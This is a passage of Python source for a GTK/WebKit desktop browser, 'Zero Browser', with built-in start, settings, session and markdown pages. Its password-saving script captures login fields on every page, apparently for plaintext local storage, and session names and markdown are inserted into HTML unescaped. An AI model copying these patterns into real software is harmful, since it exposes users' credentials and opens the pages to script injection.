import sys
import gi
import os
import json
import urllib.parse
from datetime import datetime
gi.require_version('Gtk', '3.0')
gi.require_version('WebKit2', '4.1')
from gi.repository import Gtk, Gdk, GLib, Pango
from gi.repository import WebKit2

MARKDOWN_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Markdown</title><style>body { margin: 0; padding: 0; display: flex; height: 100vh; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } .half { width: 50%; height: 100%; overflow-y: auto; padding: 20px; box-sizing: border-box; } #editor { background: #16181D; border-right: 1px solid rgba(255,255,255,0.1); border: none; color: #a0aab5; font-family: monospace; font-size: 14px; resize: none; outline: none; width: 100%; height: calc(100% - 40px); margin-top: 40px; } #preview { padding: 40px; line-height: 1.6; } #preview h1, #preview h2, #preview h3 { border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; } #preview code { background: rgba(255,255,255,0.1); padding: 2px 4px; border-radius: 4px; } #preview pre { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 8px; overflow-x: auto; } .toolbar { position: absolute; top: 0; left: 0; width: 50%; height: 40px; background: #1c1e24; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; padding: 0 20px; box-sizing: border-box; } .btn { background: #4D90FE; color: white; border: none; padding: 5px 15px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; } .btn:hover { background: #3b78e7; }</style><script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script></head><body><div class="half" style="position:relative;"><div class="toolbar"><button class="btn" onclick="saveMd()">Save File</button></div><textarea id="editor" placeholder="# Start typing Markdown here..."></textarea></div><div class="half" id="preview"></div><script>const editor = document.getElementById('editor'); const preview = document.getElementById('preview'); editor.addEventListener('input', () => { preview.innerHTML = marked.parse(editor.value); }); function saveMd() { window.webkit.messageHandlers.markdown.postMessage('save:' + encodeURIComponent(editor.value)); }</script></body></html>"""

START_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Browser Start</title><style>body { margin: 0; padding: 0; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; } .container { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 24px; padding: 40px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); animation: fadein 0.5s ease-out; } @keyframes fadein { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } } h1 { font-size: 48px; font-weight: 800; margin: 0 0 10px 0; background: linear-gradient(90deg, #4D90FE, #00C853); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } p { color: #A0AAB5; font-size: 16px; margin-bottom: 30px; } .search-box { display: flex; align-items: center; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 10px 20px; margin-bottom: 30px; width: 400px; transition: all 0.3s ease; } .search-box:focus-within { border-color: #4D90FE; box-shadow: 0 0 15px rgba(77,144,254,0.2); } .search-box input { background: transparent; border: none; color: white; font-size: 16px; width: 100%; outline: none; } .grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 15px; } .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px 10px; text-decoration: none; color: white; font-size: 14px; font-weight: 500; transition: all 0.2s; } .card:hover { background: rgba(255,255,255,0.08); transform: translateY(-2px); border-color: rgba(255,255,255,0.2); }</style></head><body><div class="container"><h1 id="time">00:00</h1><p>Welcome to Zero Browser.</p><div class="search-box"><input type="text" id="q" placeholder="Search or enter URL..." autofocus></div><div class="grid"><a href="https://github.com" class="card">GitHub</a><a href="zero://sessions" class="card">Sessions</a><a href="zero://markdown" class="card">Markdown</a><a href="https://youtube.com" class="card">YouTube</a><a href="zero://settings" class="card">Settings</a><a href="zero://shortcuts" class="card">Shortcuts</a></div></div><script>function updateTime() { const now = new Date(); document.getElementById('time').innerText = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}); } setInterval(updateTime, 1000); updateTime(); document.getElementById('q').addEventListener('keypress', function(e) { if(e.key === 'Enter') { let val = this.value; if(val.includes('.') && !val.includes(' ')) { if(!val.startsWith('http')) val = 'https://' + val; window.location.href = val; } else { window.location.href = 'zero://search?q=' + encodeURIComponent(val); } } });</script></body></html>"""

SETTINGS_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Settings</title><style>body { margin: 0; padding: 40px; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } h1 { font-size: 36px; font-weight: 800; margin-bottom: 30px; } .section { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 25px; margin-bottom: 20px; } h2 { font-size: 20px; margin-top: 0; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 20px; } .btn { background: #4D90FE; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; margin-right: 10px; transition: 0.2s; } .btn:hover { background: #3b78e7; } .btn-danger { background: #d32f2f; } .btn-danger:hover { background: #b71c1c; } .info { color: #A0AAB5; margin-bottom: 20px; }</style></head><body><h1>Settings</h1><div class="section"><h2>Appearance</h2><p class="info">Customize how Zero Browser looks.</p><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('toggle_theme')">Toggle Light / Dark Mode</button></div><div class="section"><h2>Privacy & Security</h2><p class="info">Prevent WebRTC IP leaks by disabling Media Stream APIs.</p><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('toggle_webrtc')">Toggle Media/WebRTC Protection</button></div><div class="section"><h2>Search Engines</h2><p class="info">Configure your custom search engines via the JSON config file.</p><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('open_search_config')">Edit Search Engines Config</button></div><div class="section"><h2>User Scripts</h2><p class="info">Load custom JS on all pages. Open the scripts folder.</p><button class="btn" onclick="window.webkit.messageHandlers.settings.postMessage('open_userscripts_dir')">Open User Scripts Folder</button></div><div class="section"><h2>Clear Browsing Data</h2><p class="info">This action is irreversible and will delete your data from the local machine.</p><button class="btn btn-danger" onclick="window.webkit.messageHandlers.settings.postMessage('clear_history')">Clear History</button><button class="btn btn-danger" onclick="window.webkit.messageHandlers.settings.postMessage('clear_bookmarks')">Clear Bookmarks</button><button class="btn btn-danger" onclick="window.webkit.messageHandlers.settings.postMessage('clear_passwords')">Clear Passwords</button></div></body></html>"""

SHORTCUTS_PAGE_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Shortcuts</title><style>body { margin: 0; padding: 40px; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } h1 { font-size: 36px; font-weight: 800; margin-bottom: 30px; } .section { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 25px; margin-bottom: 20px; } table { width: 100%; border-collapse: collapse; } th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); } th { color: #4D90FE; } kbd { background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 14px; }</style></head><body><h1>Keyboard Shortcuts</h1><div class="section"><table><tr><th>Shortcut</th><th>Action</th></tr><tr><td><kbd>Ctrl</kbd> + <kbd>Tab</kbd></td><td>Visual Tab Switcher</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>T</kbd></td><td>New Tab</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>W</kbd></td><td>Close Tab</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>L</kbd></td><td>Focus URL Bar</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>K</kbd></td><td>Command Palette</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>F</kbd></td><td>Find in Page</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>+</kbd></td><td>Zoom In</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>-</kbd></td><td>Zoom Out</td></tr><tr><td><kbd>Ctrl</kbd> + <kbd>0</kbd></td><td>Reset Zoom</td></tr><tr><td>Middle Click Tab</td><td>Close Tab</td></tr><tr><td>Right Click Tab</td><td>Context Menu (Duplicate, Close Others, Detach PiP)</td></tr><tr><td>Mouse Button 8/9</td><td>Navigate Back / Forward</td></tr></table></div></body></html>"""

SCROLLBAR_CSS = "::-webkit-scrollbar { width: 8px; height: 8px; background: #12141a; } ::-webkit-scrollbar-thumb { background: #3a3f4b; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #4d90fe; } ::-webkit-scrollbar-corner { background: #12141a; }"
COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"

PW_INJECT_JS = """
document.addEventListener('submit', function(e) {
    let form = e.target;
    let pwField = form.querySelector('input[type="password"]');
    if(pwField) {
        let userField = form.querySelector('input[type="text"], input[type="email"]');
        let user = userField ? userField.value : '';
        let pw = pwField.value;
        if(user && pw) {
            window.webkit.messageHandlers.passwords.postMessage(JSON.stringify({
                url: window.location.hostname,
                user: user,
                pass: pw
            }));
        }
    }
});
"""

def format_bytes(b):
    for x in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024.0: return "%3.1f %s" % (b, x)
        b /= 1024.0
    return "%3.1f PB" % b

class ZeroDevBrowser(Gtk.Window):
    def __init__(self):
        super().__init__(title="Zero Browser")
        self.set_default_size(1280, 800)
        
        settings = Gtk.Settings.get_default()
        settings.set_property("gtk-application-prefer-dark-theme", True)
        self.setup_css()
        
        self.tabs_map = {} 
        self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
        self.pw_path = os.path.join(os.path.expanduser("~"), ".zero_passwords.json")
        self.session_path = os.path.join(os.path.expanduser("~"), ".zero_session.json")
        self.search_engines_path = os.path.join(os.path.expanduser("~"), ".zero_search_engines.json")
        self.permissions_path = os.path.join(os.path.expanduser("~"), ".zero_site_permissions.json")
        self.named_sessions_path = os.path.join(os.path.expanduser("~"), ".zero_named_sessions.json")
        self.userscripts_dir = os.path.join(os.path.expanduser("~"), ".zero_userscripts")
        if not os.path.exists(self.userscripts_dir): os.makedirs(self.userscripts_dir)
        
        self.passwords = {}
        self.is_private = False
        self.webrtc_protected = True
        self.current_workspace = "default"
        
        self.site_permissions = {}
        self.load_site_permissions()
        
        self.named_sessions = {}
        self.load_named_sessions()
        
        self.search_engines = {
            "google": "https://google.com/search?q=",
            "ddg": "https://duckduckgo.com/?q=",
            "bing": "https://www.bing.com/search?q="
        }
        self.load_search_engines()
        
        self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.add(self.main_vbox)
        self.connect("key-press-event", self.on_key_press)
        self.connect("key-release-event", self.on_key_release)
        self.connect("button-press-event", self.on_mouse_button_press)
        
        # ================= HEADER BAR =================
        self.header = Gtk.HeaderBar()
        self.header.set_show_close_button(True)
        self.header.set_title("Zero Browser")
        self.set_titlebar(self.header)

        self.btn_tabs = Gtk.ToggleButton()
        self.btn_tabs.set_active(True)
        self.btn_tabs.add(Gtk.Image.new_from_icon_name("format-justify-left-symbolic", Gtk.IconSize.MENU))
        self.btn_tabs.set_tooltip_text("Toggle Vertical Tabs")
        self.btn_tabs.connect("toggled", self.on_tabs_toggled)
        self.header.pack_start(self.btn_tabs)

        btn_back = Gtk.Button(); btn_back.add(Gtk.Image.new_from_icon_name("go-previous-symbolic", Gtk.IconSize.MENU))
        btn_forward = Gtk.Button(); btn_forward.add(Gtk.Image.new_from_icon_name("go-next-symbolic", Gtk.IconSize.MENU))
        btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
        btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
        for b in (btn_back, btn_forward): self.header.pack_start(b)
        
        self.btn_open_file = Gtk.Button()
        self.btn_open_file.add(Gtk.Image.new_from_icon_name("document-open-symbolic", Gtk.IconSize.MENU))
        self.btn_open_file.set_tooltip_text("Open Local File")
        self.btn_open_file.connect("clicked", self.on_open_file)
        self.header.pack_start(self.btn_open_file)

        # Center Search / URL Bar
        center_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=2)
        self.search_engine_combo = Gtk.ComboBoxText()
        for k in self.search_engines.keys():
            self.search_engine_combo.append(k, k.capitalize())
        self.search_engine_combo.set_active(0)
        center_box.pack_start(self.search_engine_combo, False, False, 0)
        
        self.url_bar = Gtk.Entry()
        self.url_bar.set_placeholder_text("Search or enter web address")
        self.url_bar.set_width_chars(50)
        self.url_bar.connect("activate", self.on_url_activate)
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.PRIMARY, "network-secure-symbolic")
        self.url_bar.set_icon_tooltip_text(Gtk.EntryIconPosition.PRIMARY, "Site Permissions")
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
        self.url_bar.connect("icon-press", self.on_url_icon_press)
        
        # Smart URL Bar Autosuggestion (Gtk.EntryCompletion)
        self.url_liststore = Gtk.ListStore(str)
        self.url_completion = Gtk.EntryCompletion()
        self.url_completion.set_model(self.url_liststore)
        self.url_completion.set_text_column(0)
        self.url_completion.set_inline_completion(True)
        self.url_completion.set_popup_completion(True)
        self.url_completion.set_match_func(self.url_completion_match_func)
        self.url_completion.connect("match-selected", self.on_url_match_selected)
        self.url_bar.set_completion(self.url_completion)
        
        center_box.pack_start(self.url_bar, True, True, 0)
        
        self.lbl_zoom = Gtk.Label(label="")
        self.lbl_zoom.get_style_context().add_class("dim-label")
        center_box.pack_start(self.lbl_zoom, False, False, 5)
        
        self.header.set_custom_title(center_box)

        # POPOVERS
        self.build_downloads_popover()
        self.build_bookmarks_popover()
        self.build_history_popover()
        self.build_passwords_popover()
        self.build_permissions_popover()
        
        self.load_bookmarks()
        self.load_passwords()
        
        self.btn_reader = Gtk.Button()
        self.btn_reader.add(Gtk.Image.new_from_icon_name("format-text-bold-symbolic", Gtk.IconSize.MENU))
        self.btn_reader.set_tooltip_text("Toggle Reader Mode")
        self.btn_reader.connect("clicked", self.on_reader_mode)
        self.header.pack_end(self.btn_reader)

        self.btn_pip = Gtk.Button()
        self.btn_pip.add(Gtk.Image.new_from_icon_name("media-playback-start-symbolic", Gtk.IconSize.MENU))
        self.btn_pip.set_tooltip_text("Picture-in-Picture")
        self.btn_pip.connect("clicked", self.on_pip_toggled)
        self.header.pack_end(self.btn_pip)

        self.btn_screenshot = Gtk.Button()
        self.btn_screenshot.add(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU))
        self.btn_screenshot.set_tooltip_text("Screenshot")
        self.btn_screenshot.connect("clicked", self.on_take_screenshot)
        self.header.pack_end(self.btn_screenshot)
        
        self.btn_devtools = Gtk.ToggleButton()
        self.btn_devtools.add(Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU))
        self.btn_devtools.set_tooltip_text("Hacker Tools")
        self.btn_devtools.connect("toggled", self.on_devtools_toggled)
        self.header.pack_end(self.btn_devtools)

        self.btn_private = Gtk.ToggleButton()
        self.btn_private.add(Gtk.Image.new_from_icon_name("security-high-symbolic", Gtk.IconSize.MENU))
        self.btn_private.set_tooltip_text("Toggle Private Browsing Mode")
        self.btn_private.connect("toggled", self.on_private_toggled)
        self.header.pack_end(self.btn_private)

        self.btn_newtab = Gtk.Button()
        self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
        self.btn_newtab.set_tooltip_text("New Tab")
        self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
        self.header.pack_end(self.btn_newtab)

        # ================= LAYOUT =================
        self.hpaned_workspace = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
        self.main_vbox.pack_start(self.hpaned_workspace, True, True, 0)
        
        self.tabs_revealer = Gtk.Revealer(); self.tabs_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.tabs_revealer.set_reveal_child(True)
        self.tabs_box = self.build_tabs_sidebar(); self.tabs_revealer.add(self.tabs_box)
        self.hpaned_workspace.pack1(self.tabs_revealer, False, False)
        
        self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
        self.hpaned_workspace.pack2(self.vpaned, True, False)
        
        self.tab_stack = Gtk.Stack(); self.tab_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
        
        # Find Bar Overlay
        self.overlay = Gtk.Overlay()
        self.overlay.add(self.tab_stack)
        
        self.find_revealer = Gtk.Revealer(); self.find_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_DOWN); self.find_revealer.set_reveal_child(False)
        self.find_revealer.set_halign(Gtk.Align.END); self.find_revealer.set_valign(Gtk.Align.START)
        
        fb = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        fb.get_style_context().add_class("find-bar")
        fb.set_margin_top(10); fb.set_margin_end(20)
        
        self.find_entry = Gtk.SearchEntry(); self.find_entry.set_placeholder_text("Find in page...")
        self.find_entry.connect("search-changed", self.on_find_changed)
        self.find_entry.connect("activate", lambda e: self.on_find_next(None))
        
        self.find_lbl = Gtk.Label(label="0/0"); self.find_lbl.get_style_context().add_class("dim-label")
        btn_prev = Gtk.Button(); btn_prev.add(Gtk.Image.new_from_icon_name("go-up-symbolic", Gtk.IconSize.MENU)); btn_prev.connect("clicked", self.on_find_prev)
        btn_next = Gtk.Button(); btn_next.add(Gtk.Image.new_from_icon_name("go-down-symbolic", Gtk.IconSize.MENU)); btn_next.connect("clicked", self.on_find_next)
        btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU)); btn_close.connect("clicked", self.on_find_close)
        
        for w in (self.find_entry, self.find_lbl, btn_prev, btn_next, btn_close): fb.pack_start(w, False, False, 0)
        self.find_revealer.add(fb)
        self.overlay.add_overlay(self.find_revealer)
        
        self.vpaned.pack1(self.overlay, True, False)
        
        self.devtools_revealer = Gtk.Revealer(); self.devtools_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_UP); self.devtools_revealer.set_reveal_child(False)
        self.devtools_box = self.build_devtools(); self.devtools_revealer.add(self.devtools_box)
        self.vpaned.pack2(self.devtools_revealer, False, False)
        
        self.web_ctx = WebKit2.WebContext.new_ephemeral()
        self.web_ctx.connect("download-started", self.on_download_started)
        
        self.user_content = WebKit2.UserContentManager.new()
        self.user_content.register_script_message_handler("passwords")
        self.user_content.connect("script-message-received::passwords", self.on_password_intercepted)
        self.user_content.register_script_message_handler("settings")
        self.user_content.connect("script-message-received::settings", self.on_settings_message)
        self.user_content.register_script_message_handler("sessions")
        self.user_content.connect("script-message-received::sessions", self.on_sessions_message)
        self.user_content.register_script_message_handler("markdown")
        self.user_content.connect("script-message-received::markdown", self.on_markdown_message)
        
        for css in (SCROLLBAR_CSS, COSMETIC_ADBLOCK_CSS):
            sheet = WebKit2.UserStyleSheet(css, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
            self.user_content.add_style_sheet(sheet)
            
        pw_script = WebKit2.UserScript(PW_INJECT_JS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserScriptInjectionTime.END, None, None)
        self.user_content.add_script(pw_script)
        
        self.load_userscripts()
        
        self.adblock_enabled = True
        self.devtools_window = None
        
        self.rebuild_url_completion()
        self.load_session()

    # ================= BUILT-IN MARKDOWN EDITOR =================
    def on_markdown_message(self, manager, js_result):
        msg = js_result.get_js_value().to_string()
        if msg.startswith("save:"):
            content = urllib.parse.unquote(msg[5:])
            dialog = Gtk.FileChooserNative.new("Save Markdown", self, Gtk.FileChooserAction.SAVE, "_Save", "_Cancel")
            dialog.set_current_name("Untitled.md")
            if dialog.run() == Gtk.ResponseType.ACCEPT:
                filepath = dialog.get_filename()
                try:
                    with open(filepath, "w") as f:
                        f.write(content)
                except Exception as e:
                    print("Failed to save markdown:", e)
            dialog.destroy()


    # ================= SESSION MANAGER =================
    def load_named_sessions(self):
        if os.path.exists(self.named_sessions_path):
            try:
                with open(self.named_sessions_path, "r") as f: self.named_sessions = json.load(f)
            except: pass

    def save_named_sessions(self):
        try:
            with open(self.named_sessions_path, "w") as f: json.dump(self.named_sessions, f)
        except: pass
        
    def generate_sessions_html(self):
        cards = ""
        for name, urls in self.named_sessions.items():
            cards += f"""<div class='card'><h3>{name}</h3><p>{len(urls)} tabs</p><br><button class='btn' onclick="window.webkit.messageHandlers.sessions.postMessage('load:{name}')">Load</button><button class='btn btn-danger' onclick="window.webkit.messageHandlers.sessions.postMessage('delete:{name}')">Delete</button></div>"""
        
        return f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Zero Sessions</title><style>body {{ margin: 0; padding: 40px; background: #0f1115; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }} h1 {{ font-size: 36px; font-weight: 800; margin-bottom: 30px; }} .section {{ background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 25px; margin-bottom: 20px; }} .btn {{ background: #4D90FE; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600; margin-right: 10px; transition: 0.2s; }} .btn:hover {{ background: #3b78e7; }} .btn-danger {{ background: #d32f2f; }} .btn-danger:hover {{ background: #b71c1c; }} input {{ background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 6px; padding: 10px; color: white; font-size: 14px; margin-right: 10px; width: 300px; }} .grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-top: 20px; }} .card {{ background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px; }} h3 {{ margin-top: 0; }}</style></head><body><h1>Session Manager</h1><div class="section"><input type="text" id="sname" placeholder="Name for new session"><button class="btn" onclick="save()">Save Current Workspace as Session</button></div><div class="grid">{cards}</div><script>function save() {{ let n = document.getElementById('sname').value; if(n) window.webkit.messageHandlers.sessions.postMessage('save:'+n); }}</script></body></html>"""

    def on_sessions_message(self, manager, js_result):
        msg = js_result.get_js_value().to_string()
        if msg.startswith("save:"):
            name = msg[5:]
            session = []
            for wid, data in self.tabs_map.items():
                if data[2] == self.current_workspace:
                    uri = data[0].get_uri()
                    if uri and not uri.startswith("zero://"):
                        session.append(uri)
            self.named_sessions[name] = session
            self.save_named_sessions()
            if hasattr(self, 'current_webview'): self.current_webview.load_html(self.generate_sessions_html(), "zero://sessions")
        elif msg.startswith("load:"):
            name = msg[5:]
            if name in self.named_sessions:
                for uri in self.named_sessions[name]: self.new_tab(uri)
        elif msg.startswith("delete:"):
            name = msg[7:]
            if name in self.named_sessions:
                del self.named_sessions[name]
                self.save_named_sessions()
                if hasattr(self, 'current_webview'): self.current_webview.load_html(self.generate_sessions_html(), "zero://sessions")

    # ================= SMART URL COMPLETION =================
    def rebuild_url_completion(self):
        self.url_liststore.clear()
        added = set()
        
        for row in self.bookmarks_list.get_children():
            url = getattr(row, 'url_data', None)
            if url and url not in added:
                self.url_liststore.append([url])
                added.add(url)
                
        for row in self.history_list.get_children():
            url = getattr(row, 'url_data', None)
            if url and url not in added:
                self.url_liststore.append([url])
                added.add(url)

    def url_completion_match_func(self, completion, key, iter):
        model = completion.get_model()
        url = model.get_value(iter, 0)
        return key.lower() in url.lower() if url else False
        
    def on_url_match_selected(self, completion, model, iter):
        url = model.get_value(iter, 0)
        self.url_bar.set_text(url)
        self.on_url_activate(self.url_bar)
        return True

    # ================= HARDWARE MOUSE BUTTONS =================
    def on_mouse_button_press(self, widget, event):
        if event.button == 8: # Back
            if hasattr(self, 'current_webview'): self.current_webview.go_back()
            return True
        elif event.button == 9: # Forward
            if hasattr(self, 'current_webview'): self.current_webview.go_forward()
            return True
        return False

    # ================= TAB SWITCHER =================
    def build_tab_switcher(self):
        self.tab_switcher_window = Gtk.Window(title="Tab Switcher")
        self.tab_switcher_window.set_decorated(False)
        self.tab_switcher_window.set_default_size(600, 300)
        self.tab_switcher_window.set_position(Gtk.WindowPosition.CENTER_ON_PARENT)
        self.tab_switcher_window.set_transient_for(self)
        self.tab_switcher_window.set_modal(True)
        ctx = self.tab_switcher_window.get_style_context()
        ctx.add_class("cmd-palette")
        
        scroll = Gtk.ScrolledWindow()
        self.switcher_listbox = Gtk.ListBox()
        scroll.add(self.switcher_listbox)
        self.tab_switcher_window.add(scroll)
        
    def show_tab_switcher(self):
        if not hasattr(self, 'tab_switcher_window'): self.build_tab_switcher()
        for c in self.switcher_listbox.get_children(): self.switcher_listbox.remove(c)
        
        self.switcher_order = []
        for wid, data in self.tabs_map.items():
            if data[2] == self.current_workspace:
                wv = data[0]
                row = Gtk.ListBoxRow(); row.wid_data = wid
                hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
                hbox.set_margin_top(15); hbox.set_margin_bottom(15); hbox.set_margin_start(15)
                icon = Gtk.Image.new_from_icon_name("text-html-symbolic", Gtk.IconSize.MENU)
                vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
                lbl1 = Gtk.Label(label=wv.get_title() or "Untitled"); lbl1.set_halign(Gtk.Align.START); lbl1.get_style_context().add_class("bold-label")
                lbl2 = Gtk.Label(label=wv.get_uri() or ""); lbl2.set_halign(Gtk.Align.START); lbl2.get_style_context().add_class("dim-label"); lbl2.set_ellipsize(Pango.EllipsizeMode.END)
                vbox.pack_start(lbl1, False, False, 2); vbox.pack_start(lbl2, False, False, 0)
                hbox.pack_start(icon, False, False, 0); hbox.pack_start(vbox, True, True, 0)
                row.add(hbox); row.show_all()
                self.switcher_listbox.add(row)
                self.switcher_order.append(row)
                
        self.tab_switcher_window.show_all()
        
        current_idx = 0
        for i, row in enumerate(self.switcher_order):
            if hasattr(self, 'current_webview') and self.tabs_map[row.wid_data][0] == self.current_webview:
                current_idx = i
                break
        
        next_idx = (current_idx + 1) % len(self.switcher_order) if self.switcher_order else 0
        if self.switcher_order:
            self.switcher_listbox.select_row(self.switcher_order[next_idx])
            
    def cycle_tab_switcher(self):
        if not hasattr(self, 'switcher_order') or not self.switcher_order: return
        selected = self.switcher_listbox.get_selected_row()
        if not selected: return
        try:
            idx = self.switcher_order.index(selected)
            next_idx = (idx + 1) % len(self.switcher_order)
            self.switcher_listbox.select_row(self.switcher_order[next_idx])
        except: pass

    def activate_selected_switcher_tab(self):
        selected = self.switcher_listbox.get_selected_row()
        if selected and hasattr(selected, 'wid_data'):
            wid = selected.wid_data
            if wid in self.tabs_map:
                row = self.tabs_map[wid][1]
                self.tab_listbox.select_row(row)
                self.on_tab_clicked(self.tab_listbox, row)


    # ================= SITE PERMISSIONS =================
    def load_site_permissions(self):
        if os.path.exists(self.permissions_path):
            try:
                with open(self.permissions_path, "r") as f: self.site_permissions = json.load(f)
            except: pass

    def save_site_permissions(self):
        try:
            with open(self.permissions_path, "w") as f: json.dump(self.site_permissions, f)
        except: pass

    def apply_site_permissions(self, webview, uri):
        if not uri or uri.startswith("zero://"): return
        domain = urllib.parse.urlparse(uri).hostname
        if not domain: return
        
        perms = self.site_permissions.get(domain, {"js": True, "images": True})
        settings = webview.get_settings()
        settings.set_enable_javascript(perms["js"])
        settings.set_auto_load_images(perms["images"])
        webview.set_settings(settings)

    def build_permissions_popover(self):
        self.perm_popover = Gtk.Popover(); self.perm_popover.set_relative_to(self.url_bar)
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=10)
        box.set_margin_top(15); box.set_margin_bottom(15); box.set_margin_start(15); box.set_margin_end(15)
        
        lbl = Gtk.Label(label="Site Permissions"); lbl.get_style_context().add_class("bold-label")
        box.pack_start(lbl, False, False, 0)
        
        self.lbl_domain = Gtk.Label(label=""); self.lbl_domain.get_style_context().add_class("dim-label"); box.pack_start(self.lbl_domain, False, False, 5)
        
        hbox1 = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        l1 = Gtk.Label(label="Enable JavaScript"); l1.set_halign(Gtk.Align.START); self.switch_js = Gtk.Switch()
        hbox1.pack_start(l1, True, True, 0); hbox1.pack_end(self.switch_js, False, False, 0); box.pack_start(hbox1, False, False, 0)
        
        hbox2 = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        l2 = Gtk.Label(label="Load Images"); l2.set_halign(Gtk.Align.START); self.switch_images = Gtk.Switch()
        hbox2.pack_start(l2, True, True, 0); hbox2.pack_end(self.switch_images, False, False, 0); box.pack_start(hbox2, False, False, 0)
        
        self.switch_js.connect("notify::active", self.on_perm_changed)
        self.switch_images.connect("notify::active", self.on_perm_changed)
        
        self.perm_popover.add(box); self.perm_popover.show_all()

    def on_url_icon_press(self, entry, pos, event):
        if pos == Gtk.EntryIconPosition.PRIMARY:
